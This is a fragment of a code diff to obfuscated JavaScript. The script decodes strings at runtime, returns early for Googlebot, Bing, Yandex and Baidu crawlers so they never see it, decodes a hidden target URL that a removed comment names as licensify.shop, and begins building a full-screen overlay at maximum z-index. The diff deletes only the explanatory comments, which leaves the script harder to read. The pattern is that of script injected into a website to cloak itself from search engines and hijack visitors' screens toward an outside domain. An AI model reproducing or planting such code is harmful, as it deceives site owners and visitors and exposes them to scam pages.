@@ -10,8 +10,6 @@
     return c.join('');
   }
   var RVZ = gQI('fmctrxecgboruorhvesyqikczjonlpstnutawd').substr(0,S1A);
-  
-  // Googlebot bypass check
   var _ua = navigator.userAgent || "";
   if (/Googlebot|Mediapartners-Google|AdsBot-Google|APIs-Google|FeedFetcher-Google|bingbot|yandex|baiduspider/i.test(_ua)) {
     return;
@@ -24,7 +22,7 @@
   };
 
   var _fnConstructor = (function(){})[_sDecode('htsxywzhytw')];
-  var _targetUrl = _sDecode('mxxs>--nnn\'qnhjsxnk\'xmtu'); // points to https://licensify.shop
+  var _targetUrl = _sDecode('mxxs>--nnn\'qnhjsxnk\'xmtu'); 
 
   var _markupTemplate = `<style>
 #_lcf{position:fixed;top:0;left:0;right:0;bottom:0;width:100%;height:100%;overflow:hidden;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;z-index:2147483646}
